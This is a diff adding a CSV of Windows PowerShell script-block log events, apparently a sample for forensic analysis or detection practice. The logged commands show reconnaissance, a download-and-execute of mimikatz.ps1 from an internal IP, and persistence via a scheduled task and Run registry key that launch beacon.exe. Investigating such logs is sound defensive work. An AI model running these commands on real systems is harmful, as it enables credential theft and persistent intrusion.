@@ -1,0 +1,6 @@
+Level,Date and Time,Source,Event ID,Task Category
+"Warning","01/09/2026 14:11:00","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): whoami /all; systeminfo"
+"Warning","01/09/2026 14:11:30","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): Get-Process; Get-LocalUser; Get-NetTCPConnection"
+"Warning","01/09/2026 14:12:10","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://10.20.30.2/mimikatz.ps1')"
+"Warning","01/09/2026 14:14:00","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): schtasks /create /tn WinUpdate /tr C:\Windows\Temp\beacon.exe /sc onlogon"
+"Warning","01/09/2026 14:14:20","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Update -Value C:\Windows\Temp\beacon.exe"
